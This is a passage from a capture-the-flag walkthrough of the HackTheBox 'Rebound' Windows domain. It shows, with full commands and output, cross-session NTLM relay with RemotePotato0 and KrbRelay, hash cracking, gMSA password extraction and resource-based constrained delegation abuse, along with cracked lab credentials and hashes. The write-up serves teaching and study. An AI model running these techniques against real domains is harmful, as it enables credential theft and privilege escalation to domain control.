    128       7     1232       6068              2836   0 svchost
    138       8     1644       6540              2848   0 svchost
    178      11     2200      13756              2952   0 svchost
    279      20     3352      13036              3104   0 svchost
    138       9     1544       6728              3236   0 svchost
    407      26     3432      13356              3596   0 svchost
    188      15     6000      10312              3848   0 svchost
    152       9     1840       7036              4508   0 svchost
    340      18     6956      23720              4908   0 svchost
    321      20     9660      17140              4988   0 svchost
    316      16    17140      18904              5164   0 svchost
    229      12     2692      12996              5256   1 svchost
    375      18     6344      28436              5276   1 svchost
    169       9     2848       7692              5320   0 svchost
    207      11     2836      12220              5368   0 svchost
    116       7     1728       6264              5488   0 svchost
    172       9     1524       7560              5524   0 svchost
    166       9     5240      13140              5548   0 svchost
    254      14     2976      14088              5664   0 svchost
    131       7     1604       6440              5840   0 svchost
    203      11     2076       9748              5852   0 svchost
   1760       0      192        156                 4   0 System
    180      11     2188      11496              5324   1 taskhostw
    213      16     2380      11208              3556   0 vds
    174      11     2932      11176              2884   0 VGAuthService
    141       9     1808       7992               512   1 vm3dservice
    148       8     1696       7512              2860   0 vm3dservice
    141       9     1800       8028              3320   1 vm3dservice
    265      19     5324      17188              2480   1 vmtoolsd
    395      23    11228      23388              2896   0 vmtoolsd
    172      11     1488       7168               496   0 wininit
    283      12     2580      12960               564   1 winlogon
    407      19    11896      23384              3668   0 WmiPrvSE
    889      27   102088     121976       1.58   5624   0 wsmprovhost

```

There’s a bunch of processes in session 1. Typically on HTB machines when no one is logged in, I’ll see `LogonUI` and a couple other processes, but here `explorer` is running, and it looks like someone is actually logged in.

#### Session

`qwinsta` is the command to [display information about the session host](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/qwinsta), but it fails:

```
*Evil-WinRM* PS C:\> qwinsta *
qwinsta.exe : No session exists for *
    + CategoryInfo          : NotSpecified: (No session exists for *:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError

```

I came across [this Security Stack Exchange post](https://security.stackexchange.com/questions/272327/cannot-qwinsta-during-winrm-but-it-works-when-run-under-newcredentials-logo), which doesn’t explain why, but shows that `RunasCs.exe` makes it work (and this author is likely trying to solve Rebound). I’ll download [the latest release](https://github.com/antonioCoco/RunasCs/releases) and upload it to Rebound:

```
*Evil-WinRM* PS C:\programdata> upload /opt/RunasCs/RunasCs.exe \programdata\RunasCs.exe
Info: Uploading /opt/RunasCs/RunasCs.exe to \programdata\RunasCs.exe
                                                             
Data: 68948 bytes of 68948 bytes copied

Info: Upload successful!

```

Now only does it work, but it shows the TBrady user is logged in:

```
*Evil-WinRM* PS C:\programdata> .\RunasCs.exe x x qwinsta -l 9

 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
>services                                    0  Disc
 console           tbrady                    1  Active

```

#### BloodHound

TBrady has `ReadGMSAPassword` on the Delegator$ account, which seems like it might be interesting:

![image-20240318213926626](/img/image-20240318213926626.png)

It seems like that’s my current target.

### Cross Session Relay

I’m going to abuse the logged in session by TBrady by triggering an authentication back to my box and relaying it to dump a hash. I did something similar in [Absolute](/2023/05/27/htb-absolute.html#shell-as-administrator), but there I got the administrator account, which allowed me to just add an admin user and be done. Here I’ll be targeting the TBrady user, so what I can get via relay is more limited.

There’s a couple ways to do this:
- RemotePotato0
- KrbRelay

I’ll show both.

#### RemotePotato0

`RemotePotato0` is a tool that:

> It abuses the DCOM activation service and trigger an NTLM authentication of any user currently logged on in the target machine. It is required that a privileged user is logged on the same machine (e.g. a Domain Admin user). Once the NTLM type1 is triggered we setup a cross protocol relay server that receive the privileged type1 message and relay it to a third resource by unpacking the RPC protocol and packing the authentication over HTTP. On the receiving end you can setup a further relay node (eg. ntlmrelayx) or relay directly to a privileged resource. RemotePotato0 also allows to grab and steal NTLMv2 hashes of every users logged on a machine.

Here, since I’ll be targeting a non-admin user, I’ll focus on the hash grab. I’ll upload the [latest release](https://github.com/antonioCoco/RemotePotato0/releases):

```
*Evil-WinRM* PS C:\programdata> upload /opt/RemotePotato0/RemotePotato0.exe
Info: Uploading /opt/RemotePotato0/RemotePotato0.exe to C:\programdata\RemotePotato0.exe                 

Data: 235520 bytes of 235520 bytes copied

Info: Upload successful! 

```

To run it, I’ll use the following options:
- `-m 2` - method 2, “Rpc capture (hash) server + potato trigger”
- `-s 1` - the session of the user to target
- `-x 10.10.14.6` - set the rogue Oxid resolver IP to mine
- `-p 9999` - the port I’ll relay back to the host; not necessary since this is default, but good to explicitly state

These kind of RPC connections will only target TCP 135. Since I can’t listen on TCP 135 on Rebound (it’s already listening with the legit RPC service), I’ll have the exploit target my host, and then forward that back to `RemotePotato0` on 9999. I’ll run `socat` on my box `sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.10.11.231:9999`. So the traffic will hit my host on 135 and go back to Rebound on 9999, where `RemotePotato0` is listening.

When I run this, it dumps a NetNTMLv2 hash for TBrady:

```
*Evil-WinRM* PS C:\programdata> .\RemotePotato0.exe -m 2 -s 1 -x 10.10.14.6 -p 9999
[*] Detected a Windows Server version not compatible with JuicyPotato. RogueOxidResolver must be run remotely. Remember to forward tcp port 135 on (null) to your victim machine on port 9999
[*] Example Network redirector:
        sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP::9999
[*] Starting the RPC server to capture the credentials hash from the user authentication!!
[*] Spawning COM object in the session: 1
[*] Calling StandardGetInstanceFromIStorage with CLSID:{5167B42F-C111-47A1-ACC4-8EABE61B0B54}
[*] RPC relay server listening on port 9997 ...
[*] Starting RogueOxidResolver RPC Server listening on port 9999 ...
[*] IStoragetrigger written: 102 bytes
[*] ServerAlive2 RPC Call
[*] ResolveOxid2 RPC call
[+] Received the relayed authentication on the RPC relay server on port 9997
[*] Connected to RPC Server 127.0.0.1 on port 9999
[+] User hash stolen!

NTLMv2 Client   : DC01
NTLMv2 Username : rebound\tbrady
NTLMv2 Hash     : tbrady::rebound:2c38764642ea2aeb:216c7642dd3e5224eed40910c4aff73f:010100000000000097a7c86cdd79da01915a74c607bc396c0000000002000e007200650062006f0075006e006400010008004400430030003100040016007200650062006f0075006e0064002e006800740062000300200064006300300031002e007200650062006f0075006e0064002e00680074006200050016007200650062006f0075006e0064002e006800740062000700080097a7c86cdd79da0106000400060000000800300030000000000000000100000000200000a389c9930c336bbf842c62a142e75c43b5dd50518b92fc846dace683e90c00b90a00100000000000000000000000000000000000090000000000000000000000

```

#### KrbRelay

I’ll clone [KrbRelay](https://github.com/cube0x0/KrbRelay) to my Windows VM and compile it in Visual Studio (just like in [Absolute](/2023/05/27/htb-absolute.html#compile)). I’ll upload it to Rebound:

```
*Evil-WinRM* PS C:\programdata> upload KrbRelay.exe
Info: Uploading KrbRelay.exe to C:\programdata\KrbRelay.exe

Data: 2158592 bytes of 2158592 bytes copied

Info: Upload successful!

```

I’ll run it just like the example in the [README.md](https://github.com/cube0x0/KrbRelay/blob/main/README.md) under NTLM, except I’ll use `RunasCs.exe` to get into a `/netonly` like session just like with `qwinsta`:

```
*Evil-WinRM* PS C:\programdata> .\RunasCs.exe x x -l 9 "C:\programdata\KrbRelay.exe -session 1 -clsid 0ea79562-d4f6-47ba-b7f2-1e9b06ba16a4 -ntlm"

[*] Auth Context: rebound\tbrady
[*] Rewriting function table
[*] Rewriting PEB
[*] GetModuleFileName: System
[*] Init com server
[*] GetModuleFileName: C:\programdata\KrbRelay.exe
[*] Register com server
objref:TUVPVwEAAAAAAAAAAAAAAMAAAAAAAABGgQIAAAAAAAAmc+Yps4qzanq2s7U7pgsvAhgAAEgU//9VNESK9L4lySIADAAHADEAMgA3AC4AMAAuADAALgAxAAAAAAAJAP//AAAeAP//AAAQAP//AAAKAP//AAAWAP//AAAfAP//AAAOAP//AAAAAA==:

[*] Forcing cross-session authentication
[*] Using CLSID: 0ea79562-d4f6-47ba-b7f2-1e9b06ba16a4
[*] Spawning in session 1
[*] NTLM1
4e544c4d535350000100000097b218e2070007002c00000004000400280000000a0063450000000f444330315245424f554e44
[*] NTLM2
4e544c4d53535000020000000e000e003800000015c299e26782b294c220a57c000000000000000086008600460000000a0063450000000f7200650062006f0075006e00640002000e007200650062006f0075006e006400010008004400430030003100040016007200650062006f0075006e0064002e006800740062000300200064006300300031002e007200650062006f0075006e0064002e00680074006200050016007200650062006f0075006e0064002e006800740062000700080041ea7c1fdf79da010000000000000000000000005c00410070007000490044005c004b005070c2040b7f0000
[*] AcceptSecurityContext: SEC_I_CONTINUE_NEEDED
[*] fContextReq: Delegate, MutualAuth, ReplayDetect, SequenceDetect, UseDceStyle, Connection, AllowNonUserLogons
[*] NTLM3
tbrady::rebound:6782b294c220a57c:77296b8ade6cbb568f7861e6e9120947:010100000000000041ea7c1fdf79da0142096417ae859a680000000002000e007200650062006f0075006e006400010008004400430030003100040016007200650062006f0075006e0064002e006800740062000300200064006300300031002e007200650062006f0075006e0064002e00680074006200050016007200650062006f0075006e0064002e006800740062000700080041ea7c1fdf79da0106000400060000000800300030000000000000000100000000200000a389c9930c336bbf842c62a142e75c43b5dd50518b92fc846dace683e90c00b90a00100000000000000000000000000000000000090000000000000000000000
System.UnauthorizedAccessException: Access is denied. (Exception from HRESULT: 0x80070005 (E_ACCESSDENIED))
   at KrbRelay.IStandardActivator.StandardGetInstanceFromIStorage(COSERVERINFO pServerInfo, Guid& pclsidOverride, IntPtr punkOuter, CLSCTX dwClsCtx, IStorage pstg, Int32 dwCount, MULTI_QI[] pResults)
   at KrbRelay.Program.Main(String[] args)

```

It also gives a NetNTLMv2 hash.

### Crack Hash

Regardless of how I collected the NetNTLMv2 hash (really more a challenge / response than a hash), I can save it to a file and give it to `hashcat`:

```

$ hashcat tbrady_hash /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt 
hashcat (v6.2.6) starting in autodetect mode
...[snip]...
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

5600 | NetNTLMv2 | Network Protocol
...[snip]...
TBRADY::rebound:6782b294c220a57c:77296b8ade6cbb568f7861e6e9120947:010100000000000041ea7c1fdf79da0142096417ae859a680000000002000e007200650062006f0075006e006400010008004400430030003100040016007200650062006f0075006e0064002e006800740062000300200064006300300031002e007200650062006f0075006e0064002e00680074006200050016007200650062006f0075006e0064002e006800740062000700080041ea7c1fdf79da0106000400060000000800300030000000000000000100000000200000a389c9930c336bbf842c62a142e75c43b5dd50518b92fc846dace683e90c00b90a00100000000000000000000000000000000000090000000000000000000000:543BOMBOMBUNmanda
...[snip]...

```

The hash cracks as “543BOMBOMBUNmanda”.

### Auth Check

These creds work for SMB and LDAP, but not WinRM:

```

oxdf@hacky$ netexec smb dc01.rebound.htb -u tbrady -p 543BOMBOMBUNmanda
SMB         10.10.11.231    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.231    445    DC01             [+] rebound.htb\tbrady:543BOMBOMBUNmanda 
oxdf@hacky$ netexec winrm dc01.rebound.htb -u tbrady -p 543BOMBOMBUNmanda
WINRM       10.10.11.231    5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:rebound.htb)
WINRM       10.10.11.231    5985   DC01             [-] rebound.htb\tbrady:543BOMBOMBUNmanda
oxdf@hacky$ netexec ldap dc01.rebound.htb -u tbrady -p 543BOMBOMBUNmanda -k
SMB         dc01.rebound.htb 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)
LDAPS       dc01.rebound.htb 636    DC01             [+] rebound.htb\tbrady 

```

The lack of WinRM isn’t surprising, as TBrady is lacking any group that would enable that:

```
*Evil-WinRM* PS C:\> net user tbrady
User name                    tbrady
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            4/8/2023 2:08:31 AM
Password expires             Never
Password changeable          4/9/2023 2:08:31 AM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   3/19/2024 2:29:58 AM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users
The command completed successfully.

```

## Auth as delegator$

### Recover Hash

TBrady has `ReadGMSAPassword` over the delegator$ account. I’ll show three different tools to collect the NTLM hash of delegator$ using GMSA.

#### bloodyAD

I already noted [above](#bloodhound) that TBrady has ReadGMSAPassword on Delegator$. [This page](https://www.thehacker.recipes/a-d/movement/dacl/readgmsapassword) from Hacker Recipes has a bunch of ways to do it. I’ll use `bloodyAD` to dump it:

```

oxdf@hacky$ bloodyAD -d rebound.htb -u tbrady -p 543BOMBOMBUNmanda --host dc01.rebound.htb get object 'delegator$' --attr msDS-ManagedPassword

distinguishedName: CN=delegator,CN=Managed Service Accounts,DC=rebound,DC=htb
msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:e1630b0e18242439a50e9d8b5f5b7524
msDS-ManagedPassword.B64ENCODED: 5bJ7n8t25Xmw187W3VrZocgFCr8VnedxIVdiml6khM2WAeex8N5QleqK4/TcRNUDQ8flaPX1lbwNF+GRtnHQMEM9WLY22DgoU/ZDOfYlHp/iSFjCEtRtRobUf+Mr1bbAiAY9+5Xb6nco/v8kWT4LE9hDH3bkfSe4TOJEVpHURKg5vJqEfL8hTviel0YNdJBF0VsMWJ1pWtSjwuW2bvncgqaMhol6i9Qpn0ADf7srMqMR5XXdVHxCcAyr08Q89fhlyTKOb4YfhnQvHGROtsUp0ySKNHLTv4bYDy6u2J/YBefaK6LraH+RwP/yRodXQTvD3wzDAmjx/QqRfEy7j1hL9A==

```

#### GMSAPasswordReader.exe

Alternatively, the BloodHound documentation suggests [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader). I’ll clone the repo and build it in my Windows VM, and then upload it to Rebound:

```
*Evil-WinRM* PS C:\ProgramData> upload GMSAPasswordReader.exe
Info: Uploading GMSAPasswordReader.exe to C:\ProgramData\GMSAPasswordReader.exe
                                                             
Data: 140628 bytes of 140628 bytes copied

Info: Upload successful!

```

Running it as TBrady works:

```
*Evil-WinRM* PS C:\ProgramData> .\RunasCs.exe tbrady 543BOMBOMBUNmanda -l 2 "\programdata\GMSAPasswordReader.exe --accountname delegator$"
[*] Warning: The logon for user 'tbrady' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

Calculating hashes for Old Value
[*] Input username             : delegator$
[*] Input domain               : REBOUND.HTB
[*] Salt                       : REBOUND.HTBdelegator$
[*]       rc4_hmac             : 8689904D05752E977A546E201D09E724
[*]       aes128_cts_hmac_sha1 : BA45C8A99C448C63FBA3C5E9C433BF51
[*]       aes256_cts_hmac_sha1 : 6D0D5523515AC20557EF075F15462EEDFEC8D649A3E84DBC298FF73B7C720F72
[*]       des_cbc_md5          : 3192102AC4A10EAD

Calculating hashes for Current Value
[*] Input username             : delegator$
[*] Input domain               : REBOUND.HTB
[*] Salt                       : REBOUND.HTBdelegator$
[*]       rc4_hmac             : E1630B0E18242439A50E9D8B5F5B7524
[*]       aes128_cts_hmac_sha1 : 2498DB6793463D13F5EBEA04EFC110A0
[*]       aes256_cts_hmac_sha1 : 63EFD5D889B3006863B1E22A8EB92743B1B77D19C34AA9BB379F11AB65FA9771
[*]       des_cbc_md5          : 62FE0EEA868F4FCE

```

The “Current” `rc4_hmac` is the NTLM hash, matching the one from `bloodyAD`.

#### netexec

`netexec` can get the NTLM for the delegator$ account as well:

```

oxdf@hacky$ netexec ldap rebound.htb -u tbrady -p 543BOMBOMBUNmanda -k --gmsa
SMB         rebound.htb     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)
LDAP        rebound.htb     636    DC01             [+] rebound.htb\tbrady:543BOMBOMBUNmanda 
LDAP        rebound.htb     636    DC01             [*] Getting GMSA Passwords
LDAP        rebound.htb     636    DC01             Account: delegator$           NTLM: e1630b0e18242439a50e9d8b5f5b7524

```

### Auth Check

The hash works for SMB and LDAP but not WinRM:

```

oxdf@hacky$ netexec smb dc01.rebound.htb -u 'delegator$' -H e1630b0e18242439a50e9d8b5f5b7524
SMB         10.10.11.231    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.231    445    DC01             [+] rebound.htb\delegator$:e1630b0e18242439a50e9d8b5f5b7524 
oxdf@hacky$ netexec ldap dc01.rebound.htb -u 'delegator$' -H e1630b0e18242439a50e9d8b5f5b7524 -k
SMB         dc01.rebound.htb 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)
LDAPS       dc01.rebound.htb 636    DC01             [+] rebound.htb\delegator$ 
oxdf@hacky$ netexec winrm dc01.rebound.htb -u 'delegator$' -H e1630b0e18242439a50e9d8b5f5b7524
WINRM       10.10.11.231    5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:rebound.htb)
WINRM       10.10.11.231    5985   DC01             [-] rebound.htb\delegator$:e1630b0e18242439a50e9d8b5f5b7524

```

## Shell as Administrator

### Enumeration

In Bloodhound, looking at the now owned Delegator object, there’s information about delegation:

![image-20240320140332357](/img/image-20240320140332357.png)

It does not have unconstrained delegation, but it is allow to delegate HTTP for the dc01 machine object. It also has a SPN of `browser/dc01.rebound.htb`.

The Impacket script `findDelegation.py` will also show this:

```

oxdf@hacky$ findDelegation.py 'rebound.htb/delegator$' -dc-ip 10.10.11.231 -k -hashes :E1630B0E18242439A50E9D8B5F5B7524
Impacket v0.12.0.dev1+20240308.164415.4a62f39 - Copyright 2023 Fortra

[*] Getting machine hostname
[-] CCache file is not found. Skipping...
[-] CCache file is not found. Skipping...
AccountName  AccountType                          DelegationType  DelegationRightsTo    
-----------  -----------------------------------  --------------  ---------------------
delegator$   ms-DS-Group-Managed-Service-Account  Constrained     http/dc01.rebound.htb 

```

### Constrained Delegation

#### Background

To think about constrained delegation, let’s take an example of a web server and a database server. The user auths to the webserver, and the by sending it’s Service Ticket (ST, also known as Ticket Granting Service or TGS ticket) to the webserver. The webserver wants to auth as the user to the DB to only get stuff that the user is allowed to access. It sends a special TGS request to the DC asking for auth to the DC, and attaching the ST or TGS ticket from the user. The DC will check that the webserver is allowed to delegate to the DB server and that the ST / TGS ticket from the user has the forwardable flag. If so, it returns a ST / TGS ticket that says this is the user trying to access the DB. This all makes use of the [S4U2Proxy](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/bde93b0e-f3c9-4ddf-9f44-e1453be7af5a) extension.

So what happens is the user doesn’t use Kerberos to authenticate to the web server (perhaps NTLM)? The web server needs a ST / TGS ticket for the user to the web server to request one for the DB. The web server can request a ST / TGS ticket from the DC for the user to the webserver using the [S4U2Self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/02636893-7a1f-4357-af9a-b672e3e3de13) extension. This ticket will only come back with the forwardable flag *if* the delegation is configured as “Constrained w/ Protocol Transition”.

The delegation above doesn’t have the “w/ Protocol Transition” part, so I can’t just request a ST / TGS ticket and get access as any user to the DC.

#### Demonstration

To demonstrate this, running `getST.py` fails:

```

oxdf@hacky$ getST.py -spn http/dc01.rebound.htb -impersonate administrator 'rebound.htb/delegator$' -hashes :E1630B0E18242439A50E9D8B5F5B7524
Impacket v0.12.0.dev1+20240308.164415.4a62f39 - Copyright 2023 Fortra

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[-] Kerberos SessionError: KDC_ERR_BADOPTION(KDC cannot accommodate requested option)
[-] Probably SPN is not allowed to delegate by user delegator$ or initial TGT not forwardable

```

It is using S4U2Self to get a ticket for the administrator user for delegator$, and then trying to use S4U2Proxy to forward it, but it doesn’t work. The `-self` flag tells `getSt.py` to stop after the S4U2Self, getting a ticket for administrator for delegator$. The resulting ticket is missing the forwardable flag:

[![image-20240320105630470](/img/image-20240320105630470.png)*Click for full size image*](/img/image-20240320105630470.png)

### Resource-Based Constrained Delegation

#### Background

In the above constrained delegation, the DC tracked on the web server object that it was allowed to delegate (without protocol transition) for the DB. In resource-based constrained delegation, it’s similar, but the DC tracks a trusted list of accounts on the DB object what services are allowed to delegate to it, and the resource can modify it’s own list.

#### Add ldap\_monitor to delegator$

To move forward with this attack, I’m going to set ldap\_monitor as a trusted to delegate account for delegator$ using the `rbcd.py` script from Impacket.
- `rebound/delegator$` - The account to target. Will auth as this account to the DC.
- `-hashes :E1630B0E18242439A50E9D8B5F5B7524` - The hashes for this account to authenticate.
- `-k` - Use Kerberos authentication (it will use the hash to get a ticket).
- `-delegate-from ldap_monitor` - Set that `ldap_monitor` is allow to delegate.
- `delegate-to 'delegator$'` - Set the it is allow to delegate for delegator$.
- `-action write` - `write` is to set the value. Other choices for `-action` are `read`, `remove`, and `flush`.
- `-dc-ip dc01.rebound.htb` - Tell it where to find the DC.
- `-use-ldaps` - Fixes the binding issues described above.

All of this together updates the RBCD list:

```

oxdf@hacky$ rbcd.py 'rebound.htb/delegator$' -hashes :E1630B0E18242439A50E9D8B5F5B7524 -k -delegate-from ldap_monitor -delegate-to 'delegator$' -action write -dc-ip dc01.rebound.htb -use-ldaps
Impacket v0.12.0.dev1+20240308.164415.4a62f39 - Copyright 2023 Fortra

[-] CCache file is not found. Skipping...
[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] ldap_monitor can now impersonate users on delegator$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     ldap_monitor   (S-1-5-21-4078382237-1492182817-2568127209-7681)
oxdf@hacky$ findDelegation.py 'rebound.htb/delegator$' -dc-ip 10.10.11.231 -k -hashes :E1630B0E18242439A50E9D8B5F5B7524
Impacket v0.12.0.dev1+20240308.164415.4a62f39 - Copyright 2023 Fortra

[*] Getting machine hostname
[-] CCache file is not found. Skipping...
[-] CCache file is not found. Skipping...
AccountName   AccountType                          DelegationType              DelegationRightsTo    
------------  -----------------------------------  --------------------------  ---------------------
ldap_monitor  Person                               Resource-Based Constrained  delegator$            
delegator$    ms-DS-Group-Managed-Service-Account  Constrained                 http/dc01.rebound.htb 

```

One other note - I lost a ton of time getting “invalid server address” errors for not having “dc01” associated with the IP of the box in my `/etc/hosts` file.

#### Get ST / TGS Ticket for DC01$ on delegator$

Now, the ldap\_monitor account is able to request a service ticket as any user on delegator$. I’m going to target the DC computer account, because the administrator account is marked as sensitive, which gives the `NOT_DELEGATED` flag:

```

(LDAPS)-[rebound.htb]-[rebound\oorend]
PV > Get-DomainUser -Identity Administrator
cn                                : Administrator
description                       : Built-in account for administering the computer/domain
distinguishedName                 : CN=Administrator,CN=Users,DC=rebound,DC=htb
memberOf                          : CN=Group Policy Creator Owners,CN=Users,DC=rebound,DC=htb
                                    CN=Domain Admins,CN=Users,DC=rebound,DC=htb
                                    CN=Enterprise Admins,CN=Users,DC=rebound,DC=htb
                                    CN=Schema Admins,CN=Users,DC=rebound,DC=htb
                                    CN=Administrators,CN=Builtin,DC=rebound,DC=htb
name                              : Administrator
objectGUID                        : {37857665-6e2e-4f12-9976-5c9babcd8282}
userAccountControl                : NORMAL_ACCOUNT [1114624]
                                    DONT_EXPIRE_PASSWORD
                                    NOT_DELEGATED
badPwdCount                       : 2
badPasswordTime                   : 03/18/2024
lastLogoff                        : 0
lastLogon                         : 03/13/2024
pwdLastSet                        : 04/08/2023
primaryGroupID                    : 513
objectSid                         : S-1-5-21-4078382237-1492182817-2568127209-500
adminCount                        : 1
sAMAccountName                    : Administrator
sAMAccountType                    : 805306368
objectCategory                    : CN=Person,CN=Schema,CN=Configuration,DC=rebound,DC=htb

```

I’ll get a ST / TGS ticket as DC01$ on delegator$ with `getST.py`:

```

oxdf@hacky$ getST.py 'rebound.htb/ldap_monitor:1GR8t@$$4u' -spn browser/dc01.rebound.htb -impersonate DC01$
Impacket v0.12.0.dev1+20240308.164415.4a62f39 - Copyright 2023 Fortra

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating DC01$
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in DC01$@browser_dc01.rebound.htb@REBOUND.HTB.ccache

```

There is a cleanup script resetting delegation, so if this doesn’t work, I’ll make sure to re-run the `rbcd.py` script above.

This saves a ST / TGS ticket as the DC computer account for delegator$ into a file, and this time it is forwardable:

```

oxdf@hacky$ describeTicket.py DC01\$@browser_dc01.rebound.htb@REBOUND.HTB.ccache 
Impacket v0.12.0.dev1+20240308.164415.4a62f39 - Copyright 2023 Fortra

[*] Number of credentials in cache: 1
[*] Parsing credential[0]:
[*] Ticket Session Key            : 2f4121ed16ccd3c37f87048cd33c2d73
[*] User Name                     : DC01$
[*] User Realm                    : rebound.htb
[*] Service Name                  : browser/dc01.rebound.htb
[*] Service Realm                 : REBOUND.HTB
[*] Start Time                    : 20/03/2024 21:07:45 PM
[*] End Time                      : 21/03/2024 07:07:44 AM
[*] RenewTill                     : 21/03/2024 21:07:44 PM
[*] Flags                         : (0x40a10000) forwardable, renewable, pre_authent, enc_pa_rep
[*] KeyType                       : rc4_hmac
[*] Base64(key)                   : L0Eh7RbM08N/hwSM0zwtcw==
[*] Kerberoast hash               : $krb5tgs$18$USER$REBOUND.HTB$*browser/dc01.rebound.htb*$4d4789a328d9af5ec4df01a6$714f71eeea8667ca4d47e012a6d23be00877af50090e6052542a508026058204d70e3f0ebd254d46c2f0578adf5bdeef765ee4142c714a40292060c2c2812b45aa34320acd323210c399dddeb5460b8b206d554e6cce0ebd67ff7b3596e5bf897575cb26d34a5743b6fb4f41817c8f2a68ff7fe63e04714a7eb0e3602711762ddadde7c0b718c288c4738652aaed3e263ce0121ee6bddb82699b578ba039734fc960b7a89de99a0bc3024403aff637cc2403db270723591cbd85802569c3024660534a4e3c0e885f27e6046ec8ff643cf77252d4930ead317c4dc3e4ff14329e21cc5f3a295dcb5af107b931ddf0c27a656d5d69582ecdcf8c655463b8034b2ba4e7b4f0b9897e2f8d609e7421827e5dc29932aa5f0dfb2cf69917b9e91238b37ce08cdec6c0ebfcb60164e7147a95e2eb2ecef8f08da786a35ff69834a96d3696c3b90a0b5dba4162ea6d83c6494b4ced3a8897a92b87a8af82c97f82d0e760109e39305daea6ba575355fd2f19f739886f78bff96d60f8110bb29d57048b0b00d8954ea044106e2460070ed56333eedc447421f4799f9831a39e80516a806ca83ee3572cb48081984442d87533b12e85ba0c732f602b423e2dc551c2e49e360d0f6b839ba5f3797804bc98d44457a0906e3e1560252189d3d0560a45c6ecb89550bbf19cdcd3359dc9113facbc2252efca92422bf07e720e3f7d39f5aaa330dd5e7d9ecbb1de8ef14548e65d96218438f48b24e62a08493f5885f357ca3a3ca3fa445edee4ffe4360100cba9315244a45b9a836c62fa0fbacf28c7472aa4929e39d3749cd99114dfe632dabad53fec59d4e8a8b89823a63005a7ec9ef286fcacc546e641b33c57708581c3e5bc1564892b3b4ce6e5ce53ce3a585815b03ffae2ae458a9318794ca0bf9f0f4868d9e43824df39bc390efd2edb9750d254fdef3915b34d88ee702e159a26fbc757d615e1146020a0fca06627aeebfbd4a60e23bd50c2b0de1968d153a7760e72b03f0a5698484be0152fd25fd109b3c286eb7a4e79c390c2f65a1c1d2f330e5b654f96972f6ecb812278f521e3e7d7845e1ca5dc1b017416a831ee785df153330a78f7407767b65afe032dcccec94354ba91778cc414b8cc585f8321918a57b3065a15369225c3643d827634211bd2558ec476d801bc5e6b878b4c075f980b0bfd0eede90905ddaa121c0d051f6636e9bcdc70f7c7d3138e8656461d5d94fa815d5e77dfae45513fa768bdad3fd112d06e6d23fdea49993adb1c1ce6447b90f66a11d7a0ba097478970483c5e2bb1e3501ac892b2ca4d4debc0c88a51d1a0eb42c8f9666cc4f95fbdcaaadd310b27e4a4e9db9a95250d3fa0e1bc79721034b0dda970955a90a404fb1e6c7ab72db9cec14079184ade2c3c64d8fe83b5bbc67557c172a5b0f84625ed3fdd6ad32897014161864de5c30e5a290c8f314e4f52d3a5a8dbc55dbf9a84f892c3027cf1eefb9641f4c8a88ee56a7600efd396f7ba3803f1cef83a2b5b332f425d3c75b247fd64782e5e56a98997127a399a79ac7e9533fe3ebe779698dcb56723575d112c34d51059dea6eb749b7f28712ab73803ca224c0520475e2a491278a50b71c85a9e4fcbc81b4239278588cb64d2f15e713e22631875b276a10915cc833420173cfd31b79849fca83dc944f9112ded8c75f6d4f6c7ea9e66615080085f4b61e3bbef3594880dca45e4ad86253ebb3431899784f112bd80ea63d566da5616c5539b49240d33e8253763e5804ebcda6a170c0fb6823225aa5d57a81e116ec14e47b4bd9c79252a0
[*] Decoding unencrypted data in credential[0]['ticket']:
[*]   Service Name                : browser/dc01.rebound.htb
[*]   Service Realm               : REBOUND.HTB
[*]   Encryption type             : aes256_cts_hmac_sha1_96 (etype 18)
[-] Could not find the correct encryption key! Ticket is encrypted with aes256_cts_hmac_sha1_96 (etype 18), but no keys/creds were supplied

```

This is what was missing above.

### Another Shot At Constrained Delegation

#### Create ST / TGS Ticket

Now that I have a ST / TGS ticket as DC01$ for delegator$, delegator$ can use that along with the constrained delegation to get a ST on DC01 as DC01.

```

oxdf@hacky$ getST.py -spn http/dc01.rebound.htb -impersonate 'DC01$' 'rebound.htb/delegator$' -hashes :E1630B0E18242439A50E9D8B5F5B7524 -additional-ticket DC01\$@browser_dc01.rebound.htb@REBOUND.HTB.ccache 
Impacket v0.12.0.dev1+20240308.164415.4a62f39 - Copyright 2023 Fortra

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating DC01$
[*]     Using additional ticket DC01$@browser_dc01.rebound.htb@REBOUND.HTB.ccache instead of S4U2Self
[*] Requesting S4U2Proxy
